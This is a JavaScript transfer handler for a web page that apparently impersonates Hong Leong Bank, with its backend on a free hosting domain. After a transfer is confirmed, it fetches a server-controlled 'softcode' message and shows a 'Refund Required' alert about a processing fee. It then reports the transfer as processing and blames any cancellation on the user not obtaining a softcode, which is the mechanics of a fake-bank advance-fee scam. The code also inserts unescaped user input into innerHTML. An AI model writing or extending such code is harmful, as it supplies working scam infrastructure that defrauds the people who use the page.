async function handleTransfer(event) {
    event.preventDefault(); // Prevent form submission

    // Get form values
    const amountInMYR = parseFloat(document.getElementById('transfer-amount').value).toFixed(2);
    const recipientName = document.getElementById('recipient-name').value;
    const recipientAccount = document.getElementById('recipient-account').value;
    const routingNumber = document.getElementById('routing-number').value;
    const bankName = document.getElementById('bank-name').value;
    const recipientEmail = document.getElementById('recipient-email').value;

    // Show SweetAlert with transfer details in MYR
    Swal.fire({
        title: 'Confirm Transfer',
        html: `<p>Amount: RM${amountInMYR}</p>
               <p>Recipient: ${recipientName}</p>
               <p>Account Number: ${recipientAccount}</p>
               <p>Routing Number: ${routingNumber}</p>
               <p>Bank: ${bankName}</p>
               <p>Email: ${recipientEmail}</p>`,
        icon: 'warning',
        showCancelButton: true,
        confirmButtonText: 'Transfer',
        cancelButtonText: 'Cancel'
    }).then(async (result) => {
        if (result.isConfirmed) {
            // Fetch softcode message from the backend
            try {
                const softcodeResponse = await fetch('https://hongleongbankbackend.onrender.com/api/getSoftcode');
                const data = await softcodeResponse.json();

                // Check if softcode message exists
                if (softcodeResponse.ok && data.message) {
                    const softcodeMessage = data.message; // Dynamic softcode message from backend

                    // Show alert message for Softcode and processing fee information
                    const userConfirmedSoftcode = await Swal.fire({
                        title: 'Refund Required',
                        html: `<p>${softcodeMessage}</p>
                               <p>A processing fee will be applied, and the bank will get in touch with you.</p>`,
                        icon: 'info',
                        confirmButtonText: 'Ok'
                    });

                    if (userConfirmedSoftcode.isConfirmed) {
                        // Proceed with the transaction (no change to the amount)
                        try {
                            const response = await fetch('https://hongleongbankbackend.onrender.com/api/addtransaction', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: JSON.stringify({
                                    amount: amountInMYR,
                                    recipientName,
                                    recipientAccount,
                                    routingNumber,
                                    bankName,
                                    recipientEmail,
                                    softcodeMessage,  // Add softcode message here
                                }),
                            });

                            const data = await response.json();

                            if (response.ok) {
                                // Display success alert
                                Swal.fire({
                                    title: 'Transfer Initiated',
                                    text: `Your transfer of RM${amountInMYR} to ${recipientName} has been processed.`,
                                    icon: 'info'
                                });

                                // Optionally, add the transaction to the transaction history table
                                const transactionHistoryTable = document.querySelector('.transaction-history tbody');
                                const currentDate = new Date().toLocaleDateString('en-US');

                                const newRow = document.createElement('tr');
                                newRow.innerHTML = `
                                    <td>${currentDate}</td>
                                    <td>Transfer to ${recipientName}</td>
                                    <td>-RM${amountInMYR}</td>
                                    <td>Processing</td>
                                `;
                                transactionHistoryTable.appendChild(newRow);

                                // Optionally, clear the form fields after successful transfer
                                document.getElementById('transfer-form').reset();
                            } else {
                                throw new Error(data.error || 'Error initiating transfer');
                            }
                        } catch (error) {
                            Swal.fire({
                                title: 'Error',
                                text: error.message,
                                icon: 'error'
                            });
                        }
                    } else {
                        // If the user cancels softcode confirmation, inform them of the cancellation
                        Swal.fire({
                            title: 'Transaction Cancelled',
                            text: 'The transaction has been cancelled as you did not obtain a softcode.',
                            icon: 'info'
                        });
                    }
                } else {
                    throw new Error('Unable to fetch softcode message from the bank');
                }
            } catch (error) {
                Swal.fire({
                    title: 'Error',
                    text: error.message,
                    icon: 'error'
                });
            }
        }
    });
}
